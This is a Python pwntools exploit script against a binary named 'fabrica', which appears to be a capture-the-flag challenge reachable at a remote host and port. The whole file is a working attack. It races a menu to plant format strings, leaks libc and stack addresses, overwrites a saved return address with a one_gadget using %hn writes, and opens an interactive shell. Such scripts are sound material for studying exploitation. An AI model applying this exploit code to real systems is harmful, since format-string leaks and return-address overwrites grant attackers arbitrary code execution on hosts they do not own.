#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./fabrica '--host=34.141.16.87' '--port=40000'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./fabrica')
context.terminal = ["remotinator", "vsplit", "-x"]
context.terminal = ["terminator", "-u", "-e"]


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.141.16.87'
port = int(args.PORT or 40000)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
brva 0x1495
ignore 5
b *main+44
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

"""
[b'Hello', b'\n'] b'\x03\x08\x00\x00\x00SINGER\x00\x00\x00\x00W\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
[b'Hello', b'\n'] b'A\x08\x00\x00\x00SINGER\x00\x00\x00\x00W\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
[b'Hello', b'\n'] b'\xff\x08\x00\x00\x00SINGER\x00\x00\x00\x00\xc75:B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
[b'Hello', b'\n'] b'>\x08\x00\x00\x00SINGER\x00\x00\x00\x00\xc75:B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
"""


def send_material(d, max_tries=10):
    if not args.LOCAL:
        io.sendlineafter(b'(5) Exit\n> ', b'1')
    else:
        io.sendlineafter(b'> ', b'1')
    recved = io.recv()
    if b'Machine is already processing materials' in recved:
        print("delaying sending ", d)
        if max_tries < 0:
            print("err sending ", d)
            raise SystemExit
        sleep(1)
        io.unrecv(b'> ')
        return send_material(d, max_tries-1)

    io.unrecv(b'> ')
    io.sendafter(b'> ', d)


def race_set_fmtstr(fmtstr):
    data = b'\xc1\x08\x00\x00\x00SINGER\x00\x04\x08\x80\xc7k\x9f\x06\x01\x80\x00\x80\xfd\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    data_procent_p = b'\x00\x08\x00\x00\x00SINGER\x00\x00\x00\x00\xc75:B\x00\x00\x00\x00\x00\x00\x00\x00'
    data_procent_p += fmtstr
    data_procent_p += b'.' * (45-len(data_procent_p))
    assert len(data_procent_p) == 45
    assert len(data) == 45

    send_material(data)
    io.sendlineafter(b'> ', b'2')
    send_material(data_procent_p)


def recv_leak():
    while True:
        io.sendline(b'4')
        d = io.recv()
        if b'FLG' in d:
            d = d[d.index(b'\x1b[0;31m')+7:]
            d = d[:d.index(b'\x1b[0;33mp')]
            d = d.replace(b'.', b'')
            d = d.replace(b'(nil)', b'0x0')
            leaks = []
            for leak in d.split(b' '):
                if not leak:
                    continue
                addr = int(leak.decode().strip(), 16)
                leaks.append(addr)

            io.unrecv(b'> ')
            return leaks

        sleep(1)


def recv_skip():
    while True:
        io.sendline(b'4')
        d = io.recv()
        if b'FLG' in d:
            io.unrecv(b'> ')
            return

        sleep(1)


libc = ELF("./libc.so.6")


def get_one_gadgets():
    return list(map(int, "335369 335381 335402 335410 540995 541008 541020 541033 932606 932609 932612 933107 933110 1078698 1078706 1078711 1078721".split(' ')))


race_set_fmtstr(b'%21$p %38$p')
libc_leak, stack_addr = recv_leak()
libc_base = libc_leak - 0x24083
libc_got = libc_base + 0x1ec000
one_gadget = libc_base + get_one_gadgets()[int(args.X)]
one_gadget_lo = one_gadget & 0xFFFF
one_gadget_lo2 = (one_gadget & 0xFFFF0000) >> 16
one_gadget_lo3 = (one_gadget & 0xFFFF00000000) >> 32

log.success(f'libc_leak {libc_leak:#x}')
log.success(f'libc_base {libc_base:#x}')
log.success(f'libc_got {libc_got:#x}')
log.success(f'stack_addr {stack_addr:#x}')
log.success(f'one_gadget {one_gadget:#x}')

stack_lower = (stack_addr & 0xFFFF)

io.clean()
io.unrecv(b'> ')
fmtstr = f'%{stack_lower-0x125}c %38$hn'
race_set_fmtstr(fmtstr.encode())
recv_skip()

io.clean()
io.unrecv(b'> ')
fmtstr = f'%{one_gadget_lo-53}c %51$hn'
race_set_fmtstr(fmtstr.encode())
recv_skip()

io.clean()
io.unrecv(b'> ')
fmtstr = f'%{stack_lower-0x125+2}c %38$hn'
race_set_fmtstr(fmtstr.encode())
recv_skip()

io.clean()
io.unrecv(b'> ')
fmtstr = f'%{one_gadget_lo2-53}c %51$hn'
race_set_fmtstr(fmtstr.encode())
recv_skip()

io.clean()
io.unrecv(b'> ')
race_set_fmtstr(b'%21$p %21$p')
overwritten, _ = recv_leak()
log.success(f'overwritten {overwritten:#x}')
print(overwritten == one_gadget)

io.clean()
io.unrecv(b'> ')
io.sendlineafter(b'> ', b'5')

log.success(f'one_gadget {one_gadget:#x}')

io.interactive()
